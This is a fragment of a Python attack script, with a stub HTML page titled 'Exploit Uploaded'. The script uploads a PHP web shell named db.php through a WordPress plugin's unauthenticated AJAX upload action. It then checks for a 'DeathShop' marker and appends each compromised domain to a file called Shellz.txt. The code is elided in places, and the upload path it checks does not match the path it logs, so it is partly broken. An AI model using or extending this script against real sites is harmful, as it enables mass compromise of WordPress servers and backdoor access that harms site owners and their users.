...
<html>
<head>
  <title>Exploit Uploaded</title>
</head>
<body><h1>Exploit Uploaded</h1>
...
def Exploit(Domain):
    try:
        if 'http' in Domain:
          ...
          Domain = 'http://'+Domain
        myup = {'file': ('db.php', uploader)}
        req = requests.post(Domain + '/wp-admin/admin-ajax.php?action=p3dlite_handle_upload', files=myup, headers=headers,verify=False, timeout=10).text
        if 'jsonrpc' in req:
          req1 = requests.get(Domain + '/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php').text
          if 'DeathShop' in req1:
            print (fg+'[+] '+ Domain + ' --> Shell Uploaded')
            open('Shellz.txt', 'a').write(Domain + '/wp-content/uploads/p3d/db.php' + '\n')
          else:
